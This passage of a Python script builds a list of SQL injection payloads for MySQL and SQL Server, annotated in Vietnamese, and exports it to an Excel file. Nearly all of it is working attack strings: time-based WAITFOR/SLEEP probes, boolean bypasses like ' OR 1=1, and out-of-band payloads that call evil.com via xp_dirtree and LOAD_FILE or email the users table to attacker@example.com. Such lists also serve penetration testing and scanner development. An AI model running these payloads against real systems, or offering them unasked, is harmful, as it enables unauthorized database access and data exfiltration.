    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Time-based SQLi: SLEEP(10) làm chậm phản hồi.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "' OR SLEEP(3)--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Time-based SQLi: SLEEP ngắn cho blind injection.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "'; WAITFOR DELAY '00:00:05'--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Time-based SQL Server: WAITFOR DELAY 5 giây.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "\"; WAITFOR DELAY '00:00:05'--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Time-based SQL Server: ký tự \" kết hợp với WAITFOR.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "' OR 1=1; WAITFOR DELAY '00:00:05'--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Time-based SQL Server: OR 1=1 và WAITFOR để kiểm thử.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "' OR 1=1; WAITFOR DELAY '00:00:10'--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Time-based SQL Server: OR và WAITFOR 10 giây.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "' OR 1=1 WAITFOR DELAY '00:00:10'--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Time-based SQL Server: OR và WAITFOR 10 giây.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "'; WAITFOR DELAY '00:00:10'--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Time-based SQL Server: ký tự ';' và WAITFOR.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "1 AND 1=1--",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Boolean-based số: 1=1 TRUE, dùng trong blind SQLi.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "1 AND 1=0--",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Boolean-based số: 1=0 FALSE, dùng để kiểm thử blind SQLi.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "1 OR 1=1#",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQL Server",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Boolean-based với comment #: 1=1 TRUE.",
    "source": "PentestMonkey MSSQL SQLi Cheat Sheet"
  },
  {
    "payload": "1 OR 1=0#",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQL Server",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Boolean-based với comment #: 1=0 FALSE.",
    "source": "PentestMonkey MSSQL SQLi Cheat Sheet"
  },
  {
    "payload": "1' OR 1=1#",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQL Server",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Boolean-based trên SQL Server, bypass luôn đúng.",
    "source": "PentestMonkey MSSQL SQLi Cheat Sheet"
  },
  {
    "payload": "0 OR 0=0--",
    "type": "In-band",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Boolean số: 0=0 TRUE, tránh quote để bypass.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "0 AND 1=0--",
    "type": "In-band",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Boolean số: 1=0 FALSE.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "1; EXEC master..xp_dirtree '\\evil.com\\share'--",
    "type": "Out-of-band",
    "technique": "Out-of-band",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Out-of-band: xp_dirtree trên SQL Server kết nối đến máy chủ khác.",
    "source": "PentestMonkey MSSQL SQLi Cheat Sheet"
  },
  {
    "payload": "1; BULK INSERT hack FROM 'C:\\\\temp\\\\data.txt'--",
    "type": "Out-of-band",
    "technique": "Out-of-band",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Out-of-band: BULK INSERT lấy dữ liệu từ file share.",
    "source": "PentestMonkey MSSQL SQLi Cheat Sheet"
  },
  {
    "payload": "1; LOAD DATA INFILE 'C:/xampp/htdocs/shell.php' INTO TABLE users--",
    "type": "Out-of-band",
    "technique": "Out-of-band",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Out-of-band: LOAD DATA tạo file trên server.",
    "source": "HackTricks - Out-of-band Exploitation"
  },
  {
    "payload": "1; SELECT LOAD_FILE('\\\\evil.com\\\\share\\\\file')--",
    "type": "Out-of-band",
    "technique": "Out-of-band",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Out-of-band: LOAD_FILE tạo request tới \\evil.com\\share.",
    "source": "HackTricks - Out-of-band Exploitation"
  },
  {
    "payload": "' OR 1=1; SELECT LOAD_FILE('\\\\evil.com\\\\a.txt')--",
    "type": "Out-of-band",
    "technique": "Out-of-band",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Out-of-band: kết hợp SQLi và LOAD_FILE exfil dữ liệu qua mạng.",
    "source": "HackTricks - Out-of-band Exploitation"
  },
  {
    "payload": "' OR 1=1; EXEC msdb.dbo.sp_send_dbmail @profile_name='DBMail',@recipients='attacker@example.com',@query='SELECT * FROM users'--",
    "type": "Out-of-band",
    "technique": "Out-of-band",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Out-of-band: sử dụng sp_send_dbmail gửi dữ liệu qua email.",
    "source": "PentestMonkey MSSQL SQLi Cheat Sheet"
  },
  {
    "payload": "1; SELECT * FROM (SELECT(SLEEP(5)))a--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Blind time-based: sử dụng SELECT SLEEP để đo độ trễ.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "1; WAITFOR DELAY '00:00:05'--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Blind time-based: WAITFOR DELAY 5s trên SQL Server.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "0 WAITFOR DELAY '00:00:05'--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Blind time-based: WAITFOR DELAY để đo thời gian phản hồi.",
    "source": "PayloadBox SQL Injection Payload List"
  }
]

df = pd.DataFrame(sql_injection_payloads)

# Reorder columns
df = df[['payload', 'type', 'technique', 'dbms', 'severity', 'purpose', 'description', 'source']]

# Save to Excel
output_path = 'sqli_payloads.xlsx'
df.to_excel(output_path, index=False)

# Display to user
print("SQL Injection Payloads Excel")
